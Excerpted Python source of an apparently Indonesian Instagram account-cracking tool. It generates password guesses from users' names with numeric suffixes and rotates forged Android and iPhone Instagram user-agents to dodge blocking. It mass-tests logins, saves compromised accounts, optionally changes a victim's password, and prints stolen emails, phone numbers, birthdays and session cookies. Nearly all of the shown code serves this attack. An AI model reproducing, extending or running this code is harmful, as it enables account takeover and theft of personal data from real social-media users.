...
class MAIN:
   ...
   def List(self, uid):
       ...
       self.MyRich('\
[green]01. 𝙉𝘼𝙍𝙐𝙏𝙊 √ [yellow]02. 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝙈𝘼𝙉𝙐𝘼𝙇 [red] X [yellow]03. 𝙍𝙀𝘾𝙊𝙑𝙀𝙍𝙔 [red] X [green]04. 𝙈𝙄𝙉𝘼𝙏𝙊 √',True)
   ...
   def Exekusy(self):
       self.MyRich('\
[yellow]PERLU DI PERHATIKAN MENGUBAH DATA MENGGUNAKAN SCRIPT DAPAT MENYEBABKAN AKUN TERKENA SESI/CHECKPOINT \
SARAN UNTUK TIDAK MENGGUNAKAN FITURE INI. JIKA ANDA INGIN MENGUBAH DATA KETIKAN [green]y [/]SEBALIKNYA KETIKAN [green]t',True)
       ...
       for self.y in nama.split(' '):
           if len(self.y) <2:continue
              ...
              if komb == '1' or komb == '01':
                 ...
                 self.x.append(self.z+'17')
                 self.x.append(self.z+'27')
                 ...
                 self.x.append(self.z+'10')
                 self.x.append(self.z+'13')
                 self.x.append(self.z+'15')
                 self.x.append(self.z+'17')
                 self.x.append(self.z+'18')
                 self.x.append(self.z+'21')
                 self.x.append(self.z+'23')
                 self.x.append(self.z+'27')
                 self.x.append(self.z+'29')
              else:
                 self.x.append(self.z+'321')
                 self.x.append(self.z+'12')
                 self.x.append(self.z+'123')
   ...
   def Exekusy2(self):
       ...
       self.MyRich('\
[yellow]01. Kata Sandi Spasi 1-5  [yellow]03. Sandi Full Name,Username 1-5\n\
[green]02. Kata Sandi Random  [yellow]04. Sandi Full Name 1-5 + Manual',True)
       ...
       self.MyRich(f'\
[green]Akun OK Di Simpan Di Folder : data/OK-Instagram-{file_ok}\n\
[yellow]Akun CP Di Simpan Di Folder : data/CP-Instagram-{file_ok}\n\
[white]- Mainkan Mode Pesawat Jika Proses Cepat 400 ID Slow 200 -')
   ...
   def AppUac(self, GoblokLu=None):
       self.andro = random.choice(['24/7.0','26/8.0.0','23/6.0.1','22/5.1.1','21/5.0.1','21/5.0.2','25/7.1.1','19/4.4.4','21/5.0','19/4.4.2','27/8.1.0','28/9','29/10','26/9','29/10','30/11','25/7.1.2'])
       self.dpis = random.choice(['320dpi','640dpi','213dpi','480dpi','420dpi','240dpi','280dpi','160dpi','560dpi','540dpi','272dpi','360dpi','720dpi','270dpi','450dpi','600dpi','279dpi','210dpi','180dpi','510dpi','300dpi','454dpi','314dpi','288dpi','401dpi','153dpi','267dpi','345dpi','493dpi','340dpi','604dpi','465dpi','680dpi','256dpi','290dpi','432dpi','273dpi','120dpi','200dpi','367dpi','419dpi','306dpi','303dpi','411dpi','195dpi','518dpi','230dpi','384dpi','315dpi','293dpi','274dpi','235dpi'])
       ...
       self.basa = random.choice(['ru_RU','en_GB','uk_UA','en_US','de_DE','it_IT','ru_UA','ar_AE','tr_TR','lv_LV','th_TH','fr_FR','sr_RS','hu_HU','bg_BG','pt_PT','pt_BR','es_ES','en_IE','nl_NL','fr_CH','de_CH','es_US','fr_CA','ru_BY','en_PH','en_AU','hy_AM','fa_IR','de_AT','cs_CZ','ru_KZ','en_CA','fr_BE','az_AZ','en_NZ','en_ZA','es_LA','ru_KG','pl_PL','es_MX','ro_RO','el_GR','iw_IL','in_ID','ga_IE','en_IN','ar_SA','ka_GE','es_CO','es_SV','hr_HR','ar_JO','es_PE','it_SM','ar_AR','en_SE','nb_NO','sk_SK','bs_BA','nl_BE','uz_UZ','sl_SI','es_CL'])
       self.basa1 = random.choice(['en','ru-RU','en-GB','uk-UA','en-US','de-DE','it-IT','ru-UA','ar-AE','tr-TR','lv-LV','th-TH','fr-FR','sr-RS','hu-HU','bg-BG','pt-PT','pt-BR','es-ES','en-IE','nl-NL','fr-CH','de-CH','es-US','fr-CA','ru-BY','en-PH','en-AU','hy-AM','fa-IR','de-AT','cs-CZ','ru-KZ','en-CA','fr-BE','az-AZ','en-NZ','en-ZA','es-LA','ru-KG','pl-PL','es-MX','ro-RO','el-GR','iw-IL','in-ID','ga-IE','en-IN','ar-SA','ka-GE','es-CO','es-SV','hr-HR','ar-JO','es-PE','it-SM','ar-AR','en-SE','nb-NO','sk-SK','bs-BA','nl-BE','uz-UZ','sl-SI','es-CL'])
       ...
       self.versi = f'{random.randint(25, 420)}.{random.randint(0, 10)}.{random.randint(0, 20)}.{random.randint(10, 55)}.{random.randint(33, 365)}'
       self.Dpis = f'{random.randint(100, 5999)}'
       self.Pxxl = f'{random.randint(100, 9999)}'
       self.Pxp = f'{random.randint(100, 8999)}'
       self.kode3 = f'{random.randint(111111111, 399999999)}'
       self.iPh = random.choice(['4,1','6,1','6,2','7,2','8,4','10,4','10,5','12,1','11,8','14,2','14,3','14,5','15,1','16,1'])
       self.Isok = random.choice(['9_2','9_2_1','9_3','9_3_1','9_3_2','9_3_3','9_3_5','10_0_2','10_1_1','10_2','10_2_1','10_3_1','10_3_2','10_3_3','11_2','11_1','11_1_1','15_6','11_1_3','11_3_2','11_2_1','11_2','13_2_1','14_2_1','15_1_1','12_1_1','12_1','12_1_2','12_2_1','16_1','16_2','13_3','13_1_1','13_2_1','14_3_5','9_1','8_1','7_1','10_1','9_1_1','8_1_1','9_2_1','8_2_2','15_3_2','15_4','14_3','13_5','14_5','13_4','16_5_1','16_0','16_1','16_1_2','16_0_1','16_0_3','16_3_1','16_4_1','16_2','16_4','16_5','16_6','16_6_1','17_0','17_3_1','17_4_1'])
       self.sc = random.choice(['2.00','3.00','2.88'])
       self.gmut = random.choice(['sidnay','wide','normal'])
       self.opo = random.choice(['CPH2109','A1601','CPH2135','CPH1937','CPH2477','CPH1941','CPH2083','CPH1923','CPH1893','CPH2481','CPH2185','PEPM00'])
       self.opp = random.choice(['OP4BA5L1','A1601','OP4EFDL1','OP4B80L1','OP56F5','OP4BFB','OP486C','CPH1893','OP5709L1','OP4F2F','OP4ECB'])
       self.infi = random.choice(['Infinix X657B','Infinix X688B','Infinix X682B','Infinix X676B','Infinix X690B','Infinix X559C'])
       self.nix = random.choice(['Infinix-X657B','Infinix -X688B','Infinix -X682B','Infinix-X676B','Infinix-X690B','Infinix-X559C'])
       self.com = random.choice(['mt6769t','qcom','mt6739','mt6762','mt8169','cheetah','trlte','mt8163','mt6761','mt6755','mt6765','mt6768','mt6789','ums9230_hulk','mt6771','mt6781','mt6762','mt6769','RMX3624','redhookbay'])
       self.vivi = random.choice(['vivo 1907','vivo 1820','V2206','V2111','vivo 1904','V2069','V2027','vivo 1902','vivo 1903','vivo 1906'])
       self.viv = random.choice(['1907','1820','V2206','2111','1904','2069','2027','2043','1902','1903','1906'])
       self.real = random.choice(['RMX3201','RMX3363','RMX3151','RMX3782','RMX2040','RMX1821'])
       self.rilmi = random.choice(['realme','Realme'])
       self.me = random.choice(['RMX3201','RE54ABL1','RE54B4L1','RE5C6CL1','RMX2040','RMX1821'])
       self.ua1 = f'Instagram {self.versi} Android ({self.andro}; {self.Dpis}dpi; {self.pxl}; INFINIX MOBILITY LIMITED/Infinix; {self.infi}; {self.nix}; {self.com}; {self.basa}; {self.kode3})'
       self.ua2 = f'Instagram {self.versi} Android ({self.andro}; {self.Dpis}dpi; {self.pxl}; {self.rilmi}; {self.real}; {self.me}; {self.com}; {self.basa}; {self.kode3})'
       self.ua3 = f'Instagram {self.versi} (iPhone{self.iPh}; iOS {self.Isok}; {self.basa}; {self.basa1}; scale={self.sc}; {self.pxl}; {self.kode3})'
       self.ua4 = f'Instagram {self.versi} Android ({self.andro}; {self.Dpis}dpi; {self.pxl}; OPPO; {self.opo}; {self.opp}; {self.com}; {self.basa}; {self.kode3})'
       self.ua5 = f'Instagram {self.versi} Android ({self.andro}; {self.Dpis}dpi; {self.pxl}; vivo; {self.vivi}; {self.viv}; {self.com}; {self.basa}; {self.kode3})'
       self.ua6 = f'Instagram {self.versi} Android ({self.andro}; {self.Dpis}dpi; {self.Pxxl}x{self.Pxp}; Google/google; Pixel 6 Pro; raven; raven; en_US; {self.kode3})'
       self.ua7 = f'Instagram {self.versi} Android ({self.andro}; {self.Dpis}dpi; 1080x2113; samsung; SM-S916U; dm2q; qcom; en_US; {self.kode3})'
       self.ua8 = f'Instagram {self.versi} Android ({self.andro}; {self.Dpis}dpi; 1080x2179; Xiaomi/POCO; M2102J20SG; vayu; qcom; it_IT; {self.kode3})'
       self.ua9 = f'Instagram {self.versi} (iPhone{self.iPh}; iOS {self.Isok}; {self.basa}; {self.basa1}; scale={self.sc}; gamut={self.gmut}; {self.Pxxl}x{self.Pxp})'
       self.ua10 = f'Instagram {self.versi} Android ({self.andro}; {self.Dpis}dpi; 1440x2560; HTC/htc; HTC U11; htc_ocndugl; htc_ocn; it_IT; {self.kode3})'
       return random.choice([self.ua1, self.ua2, self.ua3, self.ua4, self.ua5, self.ua6, self.ua7, self.ua8, self.ua9, self.ua10])
           ...
           for pwb in password:
               ...
               if 'logged_in_user' in str(_respon.text.replace('\\','')):
                    ...
                    if True in self.UbahData:
                       ...
                       self.PWX = self.SandiBaru(cookie, pwb)
                       print(f'''\r                                                                     
 {P}𝙎𝙏𝘼𝙏𝙐𝙎          : {H}𝘽𝙀𝙍𝙃𝘼𝙎𝙄𝙇 𝙈𝘼𝙎𝙐𝙆
 {P}𝙈𝙀𝙏𝙃𝙊𝘿𝙀       : {H}𝙉𝘼𝙍𝙐𝙏𝙊
 {A}𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀     : {H}{info_username}
 {A}𝙆𝘼𝙏𝘼 𝙎𝘼𝙉𝘿𝙄     : {H}{self.PWX}
 {A}𝙉𝙊𝙈𝙊𝙍 𝙃𝙋     : {H}{info_nomor_hp}
 {A}𝙀𝙈𝘼𝙄𝙇           : {H}{info_email}
 {A}𝙐𝙇𝘼𝙉𝙂 𝙏𝘼𝙃𝙐𝙉 : {H}{info_birthday}
 {A}𝙎𝙏𝘼𝙏𝙐𝙎 𝘼𝙁   : {H}{self.cex}
 {A}𝘼𝙐𝙏𝙃𝙀𝙉𝙏𝙄𝙆𝘼𝙎𝙄 : {H}{self.aut}
 {A}𝙋𝙀𝙈𝙐𝙇𝙄𝙃𝘼𝙉    : {H}{self.pem}
 {A}𝙅𝙐𝙈𝙇𝘼𝙃 𝙋𝙀𝙉𝙂𝙄𝙆𝙐𝙏 & 𝙈𝙀𝙉𝙂𝙄𝙆𝙐𝙏𝙄 : {H}{info_followers}/{info_following}
 {A}𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 𝙊𝙒𝙉𝙀𝙍 : {akunfb}
 {A}𝙄𝙉𝙄 𝘾𝙊𝙊𝙆𝙄𝙀 𝙉𝙔𝘼       : {H}{cookie}                                                  ''')
                    else:
                       print(f'''\r                                                         
 {P}𝙎𝙏𝘼𝙏𝙐𝙎       : {H}𝘽𝙀𝙍𝙃𝘼𝙎𝙄𝙇 𝙈𝘼𝙎𝙐𝙆
 {P}𝙈𝙀𝙏𝙃𝙊𝘿𝙀      : {H}𝙉𝘼𝙍𝙐𝙏𝙊
 ...
 {A}𝙄𝙉𝙄 𝘾𝙊𝙊𝙆𝙄𝙀 𝙉𝙔𝘼  : {H}{cookie}                                                  ''')
           ...
           self.Loop +=1
           _status = '200'
           Console(style=temane[0]).print(f'└──[ UPIN & IPIN: {_status} OK: {self.ResultSuccess} hitung: {self.Loop} ]',end='\r')
       except (AttributeError,requests.exceptions.ConnectionError):
          time.sleep(10)
